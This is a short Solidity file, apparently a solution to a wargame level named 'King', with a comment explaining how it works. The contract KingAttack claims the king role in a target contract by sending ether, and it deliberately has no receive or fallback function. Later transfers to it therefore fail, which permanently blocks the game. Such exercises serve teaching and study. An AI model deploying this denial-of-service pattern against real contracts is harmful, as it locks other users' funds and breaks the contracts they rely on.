// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {

  constructor(address _kingAddress) public payable {
    address(_kingAddress).call.value(msg.value)();
  }
}

/** This is the contract, very simple. We just trigger the fallback function of the game 

and we do not write a fallback function for the attacking contract 

When someone sends ether to become the new king. The transfer function will fail because there is no receive or fallback function*/